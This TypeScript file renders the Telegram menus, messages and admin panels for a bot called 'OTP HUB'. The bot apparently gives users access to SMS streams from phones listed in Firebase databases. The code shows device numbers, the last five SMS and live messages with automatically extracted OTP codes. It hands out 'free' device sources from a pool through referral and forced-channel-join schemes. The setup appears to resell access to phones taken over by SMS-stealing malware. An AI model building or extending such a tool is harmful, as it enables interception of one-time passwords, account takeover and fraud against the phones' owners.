import type { InlineKeyboardMarkup } from "telegraf/types";
import type {
  AccessStatus, AdminConnection, AdminUser, Device, DeviceSummary,
  FirebaseConnection, FreeFirebasePanel, ReferralStats, RequiredChannel
} from "./types.js";

type TelegramButton = {
  text: string;
  callback_data?: string;
  url?: string;
  style?: "primary" | "success" | "danger";
  [key: string]: unknown;
};

/**
 * Bot API 9.4 added native inline-button styles. Telegraf 4.16 does not type
 * the new field yet, so keep the existing keyboard shapes and add styles at
 * the final Telegram boundary. Older clients safely ignore the unknown field.
 */
export function premiumizeKeyboard(markup: unknown): unknown {
  // Keep callback payloads compatible with every Telegram client/API version.
  // The premium treatment is provided by the text layout and button labels.
  return markup;
}

export const homeKeyboard = (showAdmin = false): InlineKeyboardMarkup => ({
  inline_keyboard: [
    [{ text: "⚡ Generate Device", callback_data: "new_device" }, { text: "📘 How It Works", callback_data: "how_to_use" }],
    [{ text: "↻ Refresh Dashboard", callback_data: "home" }, { text: "🔐 Access & Referrals", callback_data: "free_panels" }],
    ...(showAdmin ? [[{ text: "👑 Admin Panel", callback_data: "admin" }]] : [])
  ]
});

export const navKeyboard = (backData = "back"): InlineKeyboardMarkup => ({
  inline_keyboard: [[{ text: "⬅️ Back", callback_data: backData }, { text: "🏠 Home", callback_data: "home" }]]
});

function firebaseLimitLabel(firebaseLimit: number): string {
  return firebaseLimit > 0 ? String(firebaseLimit) : "∞";
}

export const DEFAULT_WELCOME_MESSAGE = [
  "╭────────────────────╮",
  "│  🔥 OTP HUB        │",
  "│  PRIVATE ACCESS    │",
  "╰────────────────────╯",
  "",
  "Welcome to your private device access center.",
  "",
  "⚡ Generate a live device",
  "📩 Receive authorized messages",
  "🔐 Secure session controls",
  "",
  "Choose an action below to continue."
].join("\n");

export function homeText(
  _summary: { connections: number; devices: DeviceSummary },
  _firebaseLimit = 0,
  welcomeMessage = DEFAULT_WELCOME_MESSAGE
) {
  return [
    "━━━━━━━━━━━━━━━━━━━━",
    "🔥 OTP HUB  •  PRIVATE ACCESS",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    welcomeMessage || DEFAULT_WELCOME_MESSAGE,
    "",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function adminDashboardText(
  stats: { users?: string; connections?: string; devices?: string; online?: string; offline?: string } | undefined,
  pool: DeviceSummary,
  maintenanceEnabled: boolean
) {
  return [
    "━━━━━━━━━━━━━━━━━━━━",
    "👑 OTP HUB  •  ADMIN CENTER",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    "SYSTEM OVERVIEW",
    "",
    `👥 Users              ${stats?.users ?? "0"}`,
    `🔥 User Firebase      ${stats?.connections ?? "0"}`,
    `📱 Cached devices      ${stats?.devices ?? "0"}`,
    `🟢 Cached online       ${stats?.online ?? "0"}`,
    `🔴 Cached offline      ${stats?.offline ?? "0"}`,
    "",
    "🎁 FREE DEVICE POOL",
    `🔥 Sources             ${pool.total ? "Active" : "Waiting for sources"}`,
    `📱 Available devices   ${pool.total}`,
    `🟢 Online              ${pool.online}`,
    `🔴 Offline             ${pool.offline}`,
    "",
    `🛠 Maintenance         ${maintenanceEnabled ? "ON" : "OFF"}`,
    "",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function firebaseListText(connections: FirebaseConnection[], summaries: Map<string, DeviceSummary>, firebaseLimit = 0) {
  const lines = ["━━━━━━━━━━━━━━━━━━━━", "🔥 MY FIREBASE", "━━━━━━━━━━━━━━━━━━━━", "", `Connections: ${connections.length}/${firebaseLimitLabel(firebaseLimit)}`, ""];
  if (!connections.length) lines.push("No Firebase connections yet.", "", "Tap “Add Firebase” to connect your first database.");
  connections.forEach((connection, i) => {
    const s = summaries.get(connection.id) ?? { total: 0, online: 0, offline: 0 };
    lines.push(
      `🔥 Firebase ${i + 1} · ${connection.displayName}`,
      `${connection.status === "connected" ? "🟢" : "🟠"} ${connection.status.toUpperCase()}`,
      `📱 Devices: ${s.total}  ·  🟢 Online: ${s.online}`,
      `🕒 Checked: ${connection.lastChecked ?? "Not checked"}`,
      ""
    );
  });
  lines.push("━━━━━━━━━━━━━━━━━━━━");
  return lines.join("\n");
}

export function accessGateText(
  stats: ReferralStats,
  minimumReferrals: number,
  durationMinutes: number,
  channels: RequiredChannel[],
  joined: Map<string, boolean>,
  referralLink?: string,
  access?: AccessStatus
) {
  const remaining = Math.max(0, minimumReferrals - stats.qualified);
  const channelLines = channels.length
    ? channels.map(channel => `${joined.get(channel.id) ? "✅" : "❌"} ${channel.title}`).join("\n")
    : "⚠️ Admin has not configured required channels yet.";
  const accessLine = access?.active
    ? `✅ Access active for approximately ${access.remainingMinutes} minute(s).`
    : `🔒 Refer ${remaining} more qualified user${remaining === 1 ? "" : "s"} to unlock ${durationMinutes} minutes of access.`;
  return [
    "╭────────────────────╮",
    "│ 🔐 ACCESS REQUIRED  │",
    "╰────────────────────╯",
    "",
    "Unlock your private OTP device access:",
    "1️⃣ Join every required channel",
    `2️⃣ Refer ${minimumReferrals} user${minimumReferrals === 1 ? "" : "s"}`,
    `3️⃣ Verify and receive ${durationMinutes} minutes of bot access`,
    "",
    `👥 Qualified referrals: ${stats.qualified}/${minimumReferrals}`,
    `📈 Total referred: ${stats.total}`,
    accessLine,
    "",
    "📣 REQUIRED CHANNELS",
    channelLines,
    "",
    referralLink ? `🔗 Your referral link:\n${referralLink}` : "",
    "╰────────────────────╯"
  ].filter(Boolean).join("\n").slice(0, 3900);
}

export function accessGateKeyboard(
  channels: RequiredChannel[],
  referralLink?: string
): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      ...channels
        .filter(channel => channel.inviteLink || channel.chatId.startsWith("@"))
        .map(channel => [{
          text: `📣 Join ${channel.title}`,
          url: channel.inviteLink ?? `https://t.me/${channel.chatId.slice(1)}`
        }]),
      ...(referralLink ? [[{ text: "🔗 REFER & EARN", url: referralLink }]] : []),
      [{ text: "✅ Verify & Get Access", callback_data: "verify_access" }],
      [{ text: "📘 How to Use", callback_data: "how_to_use" }]
    ]
  };
}

export function deviceDetailText(device: Device, sourceName: string): string {
  return [
    "╭────────────────────╮",
    "│ ⚡ DEVICE READY     │",
    "╰────────────────────╯",
    "",
    `🔥 SOURCE   ${sourceName}`,
    `${device.status === "online" ? "🟢" : "🔴"} STATUS   ${device.status === "online" ? "ONLINE" : "OFFLINE"}`,
    "",
    `🆔 DEVICE   ${device.deviceId}`,
    `📞 NUMBER   ${device.number ?? "Unavailable"}`,
    `🔋 BATTERY  ${device.battery !== undefined ? `${device.battery}%` : "Unavailable"}`,
    "",
    "✅ Selected for live message delivery.",
    "🔁 Change Device replaces this session immediately.",
    "",
    "╰────────────────────╯"
  ].join("\n");
}

export function deviceDetailKeyboard(firebaseId: string, normalized: string): InlineKeyboardMarkup {
  const encoded = encodeURIComponent(normalized);
  return {
    inline_keyboard: [
      [{ text: "🔁 Change Device", callback_data: "change_device" }, { text: "📩 Last 5 SMS", callback_data: `last_sms:${firebaseId}:${encoded}` }],
      [{ text: "⬅️ Back", callback_data: "back" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function lastSmsText(
  device: Device,
  events: Array<{ message: string; timestamp?: string }>
): string {
  const lines = [
    "╭────────────────────╮",
    "│ 📩 LATEST MESSAGES  │",
    "╰────────────────────╯",
    "",
    `📱 ${device.deviceId}`,
    `📞 ${device.number ?? "Number unavailable"}`,
    ""
  ];
  if (!events.length) {
    lines.push("No SMS found for this selected device.");
  } else {
    events.slice(0, 5).forEach((event, index) => {
      lines.push(`${index + 1}. ${event.timestamp ?? "Time unavailable"}`, event.message, "");
    });
  }
  lines.push("Only messages from the selected device are shown.", "╰────────────────────╯");
  return lines.join("\n").slice(0, 3900);
}

function eventTimeLabel(timestamp?: string): string {
  if (!timestamp) return "Time unavailable";
  const numeric = Number(timestamp);
  const date = Number.isFinite(numeric)
    ? new Date(numeric < 10_000_000_000 ? numeric * 1000 : numeric)
    : new Date(timestamp);
  if (Number.isNaN(date.getTime())) return "Time unavailable";
  return new Intl.DateTimeFormat("en-GB", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    hour12: true,
    timeZone: "Asia/Calcutta"
  }).format(date).replace(",", " •");
}

export function liveSmsText(device: Device, message: string, timestamp?: string): string {
  const otp = message.match(/\b\d{4,8}\b/)?.[0];
  return [
    "💬 ʟɪᴠᴇ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ!",
    "〰️〰️〰️〰️〰️〰️〰️〰️〰️",
    "",
    `📱 ꜰ𝗿𝗼𝗺: 𝗗𝗘𝗩𝗜𝗖𝗘-${device.deviceId}`,
    `⏱️ 𝗧𝗶𝗺𝗲: ${eventTimeLabel(timestamp)}`,
    "",
    message,
    otp ? "" : "",
    otp ? `🔑 ᴏᴛᴘ ᴅᴇᴛᴇᴄᴛᴇᴅ: ${otp}` : "",
    "",
    "━━━━━━━━━━━━━━━━━━━━",
    "🔥 OTP HUB  •  DEVICE CENTER",
    "━━━━━━━━━━━━━━━━━━━━"
  ].filter(Boolean).join("\n").slice(0, 3900);
}

export function lastSmsKeyboard(firebaseId: string, normalized: string): InlineKeyboardMarkup {
  const encoded = encodeURIComponent(normalized);
  return {
    inline_keyboard: [
      [{ text: "🔄 Refresh", callback_data: `last_sms:${firebaseId}:${encoded}` }],
      [{ text: "🔁 Change Device", callback_data: "change_device" }],
      [{ text: "⬅️ Back", callback_data: `device:${firebaseId}:${encoded}` }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function connectionKeyboard(connections: FirebaseConnection[], prefix: string) {
  return {
    inline_keyboard: [
      ...connections.map((c, i) => [{ text: `🔥 Firebase ${i + 1}`, callback_data: `${prefix}:${c.id}` }]),
      [{ text: "➕ Add Firebase", callback_data: "add_firebase" }],
      [{ text: "⬅️ Back", callback_data: "back" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  } satisfies InlineKeyboardMarkup;
}

export function adminKeyboard(maintenanceEnabled: boolean): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: "📊 Overview", callback_data: "admin_refresh" }, { text: "👥 Users", callback_data: "admin_users" }],
      [{ text: "🔥 Connections", callback_data: "admin_connections" }, { text: "📢 Broadcast", callback_data: "broadcast" }],
      [{ text: "🔐 Access & Device Pool", callback_data: "admin_free" }],
      [{ text: "📝 Content", callback_data: "admin_content" }, { text: "🖼 Bot Images", callback_data: "admin_images" }],
      [{ text: "📣 Force Subscribe", callback_data: "admin_channels" }, { text: "🎯 Referral", callback_data: "admin_referral_min" }],
      [{ text: "🔔 Audit Channel", callback_data: "admin_audit_channel" }],
      [{ text: `🛠 Maintenance: ${maintenanceEnabled ? "ON" : "OFF"}`, callback_data: "maintenance" }, { text: "⚙️ Settings", callback_data: "admin_settings" }],
      [{ text: "📝 System Logs", callback_data: "logs" }],
      [{ text: "⬅️ Back to Home", callback_data: "home" }]
    ]
  };
}

function userLabel(user: AdminUser): string {
  const name = user.username ? `@${user.username}` : user.firstName || "Unnamed user";
  return `${user.isBanned ? "🔓" : "👤"} ${name} · ${user.telegramId}`;
}

export function adminUsersText(users: AdminUser[]): string {
  const lines = [
    "━━━━━━━━━━━━━━━━━━━━",
    "👥 USER MANAGEMENT",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    "Review registered users and control access.",
    ""
  ];
  if (!users.length) lines.push("No users registered yet.");
  users.forEach(user => {
    lines.push(
      userLabel(user),
      `${user.isBanned ? "🚫 BANNED" : "✅ ACTIVE"} · 🔥 ${user.connections} Firebase`,
      `Last active: ${user.lastActive}`,
      ""
    );
  });
  lines.push("Select a user below to toggle access.", "━━━━━━━━━━━━━━━━━━━━");
  return lines.join("\n");
}

export function adminUsersKeyboard(users: AdminUser[]): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      ...users.map(user => [{
        text: userLabel(user),
        callback_data: `admin_user:${user.telegramId}`
      }]),
      [{ text: "⬅️ Admin Dashboard", callback_data: "admin" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminUserText(user: AdminUser): string {
  return [
    "━━━━━━━━━━━━━━━━━━━━",
    "👤 USER ACCESS",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    userLabel(user),
    `${user.isBanned ? "🚫 Access is currently blocked." : "✅ Access is currently active."}`,
    `🔥 Firebase connections: ${user.connections}`,
    `📅 Joined: ${user.joinedAt}`,
    `🕒 Last active: ${user.lastActive}`,
    "",
    user.isBanned
      ? "Unban this user to restore bot access?"
      : "Ban this user to block bot access?",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function adminUserKeyboard(user: AdminUser): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: user.isBanned ? "✅ Confirm Unban" : "🚫 Confirm Ban", callback_data: `admin_user_apply:${user.telegramId}:${user.isBanned ? "unban" : "ban"}` }],
      [{ text: "⬅️ User List", callback_data: "admin_users" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminConnectionsText(connections: AdminConnection[]): string {
  const lines = [
    "━━━━━━━━━━━━━━━━━━━━",
    "🔥 ALL FIREBASE CONNECTIONS",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    "Read-only overview across all users.",
    ""
  ];
  if (!connections.length) lines.push("No Firebase connections found.");
  connections.forEach(connection => {
    const owner = connection.username ? `@${connection.username}` : connection.firstName || connection.telegramId;
    lines.push(
      `${connection.status === "connected" ? "🟢" : "🟠"} ${connection.displayName}`,
      `👤 Owner: ${owner} · ${connection.telegramId}`,
      `📱 Devices: ${connection.devices}  ·  🟢 Online: ${connection.online}`,
      `🕒 Checked: ${connection.lastChecked ?? "Not checked"}`,
      ""
    );
  });
  lines.push("━━━━━━━━━━━━━━━━━━━━");
  return lines.join("\n");
}

export function adminConnectionsKeyboard(): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: "🔄 Refresh", callback_data: "admin_connections" }],
      [{ text: "⬅️ Admin Dashboard", callback_data: "admin" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminSettingsText(_firebaseLimit: number, maintenanceEnabled: boolean): string {
  return [
    "━━━━━━━━━━━━━━━━━━━━",
    "⚙️ ADMIN SETTINGS",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    `🛠 Maintenance mode: ${maintenanceEnabled ? "ON" : "OFF"}`,
    "🔥 Firebase connections: Unlimited",
    "",
    "Bulk Firebase additions are checked source-by-source before activation.",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function adminSettingsKeyboard(_firebaseLimit: number, maintenanceEnabled: boolean): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: `🛠 Maintenance ${maintenanceEnabled ? "OFF" : "ON"}`, callback_data: "maintenance" }],
      [{ text: "⬅️ Admin Dashboard", callback_data: "admin" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export const DEFAULT_HOW_TO_USE_MESSAGE =
  "ℹ️ HOW TO USE\n\nAdd one or many Firebase Realtime Database URLs in one message. Use one URL per line or separate them with commas. Each URL is checked one-by-one and dead URLs are reported separately. Device data is deduplicated before display. Use Refresh for the latest data.\n\nℹ️ Firebase links and short summaries may be shared with admins for support.";

export const DEFAULT_MAINTENANCE_MESSAGE =
  "🛠 BOT UNDER MAINTENANCE\n\nThe bot is currently undergoing maintenance.\nPlease try again later.";

export const DEFAULT_REFERRAL_MESSAGE = [
  "━━━━━━━━━━━━━━━━━━━━",
  "✨ FREE PANELS",
  "━━━━━━━━━━━━━━━━━━━━",
  "",
  "👥 Tere refers: {qualified}/{minimum}",
  "📈 Total referred: {total}",
  "",
  "🎯 UNLOCK kaise kare?",
  "1️⃣ Neeche wala REFER link dosto ko bhejo",
  "2️⃣ Wo bot start kare + SAARE channels join kare",
  "3️⃣ Referral verify hone ke baad free Firebase claim karo",
  "",
  "{unlock_status}",
  "{required_channels}",
  "",
  "🔗 Your referral link:",
  "{referral_link}",
  "",
  "━━━━━━━━━━━━━━━━━━━━"
].join("\n");

function fillTemplate(template: string, values: Record<string, string>): string {
  return template.replace(/\{([a-z_]+)\}/gi, (_, key: string) => values[key.toLowerCase()] ?? `{${key}}`);
}

export function freePanelText(
  stats: ReferralStats,
  minimumReferrals: number,
  channels: RequiredChannel[],
  joined: Map<string, boolean>,
  availablePanels: number,
  referralLink?: string,
  claimed?: FreeFirebasePanel,
  template = DEFAULT_REFERRAL_MESSAGE
): string {
  const remaining = Math.max(0, minimumReferrals - stats.qualified);
  let unlockStatus: string;
  if (claimed) {
    unlockStatus = ["✅ FREE FIREBASE ALREADY CLAIMED", "", `🔥 ${claimed.displayName}`, `🔗 ${claimed.firebaseUrl}`, "", "Ye reward tumhare account me add kar diya gaya hai."].join("\n");
  } else if (remaining > 0) {
    unlockStatus = `⏳ ${remaining} qualified referral${remaining === 1 ? "" : "s"} aur chahiye.`;
  } else if (!availablePanels) {
    unlockStatus = ["✅ Referral target complete hai.", "", "⏳ Admin pool me abhi koi free Firebase available nahi hai."].join("\n");
  } else {
    unlockStatus = ["✅ Referral target complete hai.", "", "🎁 Ab tum free Firebase claim kar sakte ho."].join("\n");
  }
  const requiredChannels = channels.length
    ? ["📣 REQUIRED CHANNELS", ...channels.map(channel => `${joined.get(channel.id) ? "✅" : "❌"} ${channel.title}`)].join("\n")
    : "";
  return fillTemplate(template || DEFAULT_REFERRAL_MESSAGE, {
    qualified: String(stats.qualified),
    minimum: String(minimumReferrals),
    total: String(stats.total),
    available: String(availablePanels),
    remaining: String(remaining),
    referral_link: referralLink ?? "Referral link unavailable",
    unlock_status: unlockStatus,
    required_channels: requiredChannels
  }).slice(0, 3900);
}

export function adminContentText(
  referralMessage: string,
  maintenanceMessage: string,
  howToUseMessage: string,
  welcomeMessage: string
): string {
  const status = (value: string, fallback: string) => value && value !== fallback ? "✅ Customized" : "↩️ Default";
  return [
    "━━━━━━━━━━━━━━━━━━━━",
    "📝 BOT CONTENT",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    `🎯 Referral message: ${status(referralMessage, DEFAULT_REFERRAL_MESSAGE)}`,
    `🛠 Maintenance message: ${status(maintenanceMessage, DEFAULT_MAINTENANCE_MESSAGE)}`,
    `📘 How to Use message: ${status(howToUseMessage, DEFAULT_HOW_TO_USE_MESSAGE)}`,
    `🏠 Welcome message: ${status(welcomeMessage, DEFAULT_WELCOME_MESSAGE)}`,
    "",
    "Har message ko neeche se edit karke multiline text bhej sakte ho.",
    "Referral placeholders: {qualified}, {minimum}, {total}, {available}, {remaining}, {referral_link}, {unlock_status}, {required_channels}",
    "",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function adminContentKeyboard(): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: "✏️ Edit Referral Message", callback_data: "admin_content_referral" }],
      [{ text: "✏️ Edit Maintenance Message", callback_data: "admin_content_maintenance" }],
      [{ text: "✏️ Edit How to Use", callback_data: "admin_content_how_to_use" }],
      [{ text: "✏️ Edit Welcome Message", callback_data: "admin_content_welcome" }],
      [{ text: "⬅️ Admin Dashboard", callback_data: "admin" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminContentPrompt(kind: "referral" | "maintenance" | "how_to_use" | "welcome"): string {
  if (kind === "referral") {
    return [
      "✏️ EDIT REFERRAL MESSAGE",
      "",
      "Send the complete message. Multiline text is supported.",
      "",
      "Available placeholders:",
      "{qualified} {minimum} {total} {available} {remaining}",
      "{referral_link} {unlock_status} {required_channels}",
      "",
      "Send /cancel to stop."
    ].join("\n");
  }
  if (kind === "maintenance") return "✏️ EDIT MAINTENANCE MESSAGE\n\nSend the message users should see during maintenance.\n\nSend /cancel to stop.";
  if (kind === "how_to_use") return "✏️ EDIT HOW TO USE\n\nSend the complete How to Use message. Multiline text is supported.\n\nSend /cancel to stop.";
  return "✏️ EDIT WELCOME MESSAGE\n\nSend the premium welcome text users should see on Home. Multiline text is supported.\n\nSend /cancel to stop.";
}

export function adminImagesText(
  welcomeConfigured: boolean,
  accessConfigured: boolean,
  deviceConfigured: boolean
): string {
  const status = (configured: boolean) => configured ? "✅ Configured" : "⚪ Not configured";
  return [
    "━━━━━━━━━━━━━━━━━━━━",
    "🖼 BOT IMAGE STUDIO",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    "Give each important screen its own branded visual.",
    "",
    `🏠 Welcome / Home: ${status(welcomeConfigured)}`,
    `🔐 Access Gate: ${status(accessConfigured)}`,
    `📱 Device Details: ${status(deviceConfigured)}`,
    "",
    "Send a Telegram photo after choosing a slot. Telegram file IDs are stored securely, so images remain fast and reliable.",
    "Recommended: portrait artwork or a clean 16:9 premium banner.",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function adminImagesKeyboard(
  welcomeConfigured: boolean,
  accessConfigured: boolean,
  deviceConfigured: boolean
): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: "🏠 Set Welcome Image", callback_data: "admin_image_welcome" }],
      ...(welcomeConfigured ? [[{ text: "🗑 Remove Welcome Image", callback_data: "admin_image_remove_welcome" }]] : []),
      [{ text: "🔐 Set Access Gate Image", callback_data: "admin_image_access" }],
      ...(accessConfigured ? [[{ text: "🗑 Remove Access Image", callback_data: "admin_image_remove_access" }]] : []),
      [{ text: "📱 Set Device Image", callback_data: "admin_image_device" }],
      ...(deviceConfigured ? [[{ text: "🗑 Remove Device Image", callback_data: "admin_image_remove_device" }]] : []),
      [{ text: "⬅️ Admin Dashboard", callback_data: "admin" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminAuditChannelText(chatId: string, title: string, link: string): string {
  return [
    "━━━━━━━━━━━━━━━━━━━━",
    "🔔 ADMIN AUDIT CHANNEL",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    chatId ? `✅ Configured: ${title || chatId}` : "⚪ Not configured",
    chatId ? `🆔 ${chatId}` : "",
    link ? `🔗 ${link}` : "",
    "",
    "New Firebase batch summaries will be sent here.",
    "Only successful Firebase links and short totals are forwarded—no OTPs or device messages.",
    "Bot ko channel me admin/member permission dena zaroori hai.",
    "━━━━━━━━━━━━━━━━━━━━"
  ].filter(Boolean).join("\n");
}

export function adminAuditChannelKeyboard(configured: boolean): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: configured ? "✏️ Change Audit Channel" : "➕ Set Audit Channel", callback_data: "admin_audit_channel_edit" }],
      ...(configured ? [[{ text: "🗑 Disable Audit Forwarding", callback_data: "admin_audit_channel_disable" }]] : []),
      [{ text: "⬅️ Admin Dashboard", callback_data: "admin" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminChannelsText(channels: RequiredChannel[]): string {
  const lines = [
    "━━━━━━━━━━━━━━━━━━━━",
    "📣 FORCE SUBSCRIBE CHANNELS",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    "Users must join and verify every configured channel before their referral counts.",
  ];
  if (!channels.length) lines.push("", "No force subscribe channels configured. Referrals qualify after bot start.");
  channels.forEach((channel, index) => {
    lines.push("", `${index + 1}. ${channel.title}`, `🆔 ${channel.chatId}`, `🔗 ${channel.inviteLink ?? "No invite link"}`);
  });
  lines.push("", "━━━━━━━━━━━━━━━━━━━━");
  return lines.join("\n");
}

export function freePanelKeyboard(
  channels: RequiredChannel[],
  referralLink: string | undefined,
  claimed: boolean,
  canClaim: boolean
): InlineKeyboardMarkup {
  const rows = channels
    .filter(channel => channel.inviteLink || channel.chatId.startsWith("@"))
    .map(channel => [{
      text: `📣 Join ${channel.title}`,
      url: channel.inviteLink ?? `https://t.me/${channel.chatId.slice(1)}`
    }]);
  return {
    inline_keyboard: [
      ...(referralLink ? [[{ text: "🔗 REFER & EARN", url: referralLink }]] : []),
      ...rows,
      [{ text: "✅ Check Join / Refresh", callback_data: "free_panels" }],
      ...(!claimed && canClaim ? [[{ text: "🎁 CLAIM FREE FIREBASE", callback_data: "claim_free_firebase" }]] : []),
      [{ text: "⬅️ Back", callback_data: "back" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminFreeAccessText(
  minimumReferrals: number,
  accessDurationMinutes: number,
  panels: FreeFirebasePanel[],
  channels: RequiredChannel[]
): string {
  const available = panels.filter(panel => panel.active && !panel.assignedTo).length;
  const assigned = panels.filter(panel => panel.assignedTo).length;
  return [
    "━━━━━━━━━━━━━━━━━━━━",
    "🔐 ACCESS & DEVICE POOL",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    `🎯 Minimum qualified referrals: ${minimumReferrals}`,
    `⏱ Timed bot access: ${accessDurationMinutes} minutes`,
    `🔥 Device sources: ${available} active · ${assigned} previously assigned`,
    `📣 Force subscribe channels: ${channels.length}`,
    "",
    "Admin yahan se referral target, access duration, random device source pool, aur required channels control kar sakta hai.",
    "🎁 Use Gift Bot Access to give 35 minutes or 1 hour to one user or everyone.",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function adminFreeAccessKeyboard(): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: "🎯 Minimum Referrals", callback_data: "admin_referral_min" }],
      [{ text: "⏱ Access Duration", callback_data: "admin_access_duration" }],
      [{ text: "🎁 Gift Bot Access", callback_data: "admin_gift_access" }],
      [{ text: "🔥 Manage Device Sources", callback_data: "admin_free_pool" }],
      [{ text: "📣 Manage Required Channels", callback_data: "admin_channels" }],
      [{ text: "⬅️ Admin Dashboard", callback_data: "admin" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminGiftAccessText(): string {
  return [
    "╭────────────────────╮",
    "│ 🎁 GIFT BOT ACCESS  │",
    "╰────────────────────╯",
    "",
    "Choose a duration and recipient group.",
    "Access is added to the recipient's current expiry.",
    "",
    "35 minutes or 1 hour are available.",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function adminGiftAccessKeyboard(): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: "🎁 35 min · All Users", callback_data: "admin_gift:all:35" }],
      [{ text: "🎁 1 hour · All Users", callback_data: "admin_gift:all:60" }],
      [{ text: "👤 Gift Specific User", callback_data: "admin_gift_specific" }],
      [{ text: "⬅️ Access & Pool", callback_data: "admin_free" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminGiftSpecificText(telegramId?: number): string {
  return [
    "╭────────────────────╮",
    "│ 👤 SPECIFIC ACCESS  │",
    "╰────────────────────╯",
    "",
    telegramId ? `Selected user: ${telegramId}` : "Send the user's Telegram ID.",
    "",
    "Then choose 35 minutes or 1 hour.",
    "Send /cancel to stop.",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function adminGiftSpecificKeyboard(telegramId: number): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: "🎁 Give 35 minutes", callback_data: `admin_gift:specific:${telegramId}:35` }],
      [{ text: "🎁 Give 1 hour", callback_data: `admin_gift:specific:${telegramId}:60` }],
      [{ text: "⬅️ Gift Access", callback_data: "admin_gift_access" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminReferralText(minimumReferrals: number): string {
  return [
    "━━━━━━━━━━━━━━━━━━━━",
    "🎯 REFERRAL REQUIREMENT",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    `Current minimum: ${minimumReferrals} qualified referrals`,
    "",
    "Qualified referral ka matlab: referred user ne bot start karke required channels verify kiye hain. Target complete hone par timed access milta hai.",
    "━━━━━━━━━━━━━━━━━━━━"
  ].join("\n");
}

export function adminReferralKeyboard(minimumReferrals: number): InlineKeyboardMarkup {
  const options = [0, 1, 3, 5, 10, 20];
  return {
    inline_keyboard: [
      options.map(value => ({ text: `${value === minimumReferrals ? "✅ " : ""}${value}`, callback_data: `admin_referrals:${value}` })),
      [{ text: "✏️ Custom Minimum", callback_data: "admin_referrals_custom" }],
      [{ text: "⬅️ Free Access", callback_data: "admin_free" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminFreePoolText(panels: FreeFirebasePanel[]): string {
  const lines = [
    "━━━━━━━━━━━━━━━━━━━━",
    "🔥 DEVICE SOURCE POOL",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    "Active Firebase sources used for random device selection. Paste one or many URLs; every source is checked before it becomes active:"
  ];
  if (!panels.length) lines.push("", "No free Firebase panels added yet.");
  panels.forEach((panel, index) => {
    lines.push(
      "",
      `${index + 1}. ${panel.displayName}`,
      `🔗 ${panel.firebaseUrl}`,
      panel.assignedTo ? `✅ Assigned to: ${panel.assignedTo}` : "🟢 Available"
    );
  });
  lines.push("", "━━━━━━━━━━━━━━━━━━━━");
  return lines.join("\n");
}

export function adminFreePoolKeyboard(panels: FreeFirebasePanel[]): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: "➕ Add Firebase Sources", callback_data: "admin_free_pool_add" }],
      ...panels.map(panel => [{
       text: `🗑 Remove ${panel.displayName}`,
        callback_data: `admin_free_pool_remove:${panel.id}`
      }]),
      [{ text: "⬅️ Free Access", callback_data: "admin_free" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}

export function adminChannelsKeyboard(channels: RequiredChannel[]): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [{ text: "➕ Add Force Subscribe", callback_data: "admin_channel_add" }],
      ...channels.map(channel => [{
        text: `🗑 Remove ${channel.title}`,
        callback_data: `admin_channel_remove:${channel.id}`
      }]),
      [{ text: "⬅️ Free Access", callback_data: "admin_free" }, { text: "🏠 Home", callback_data: "home" }]
    ]
  };
}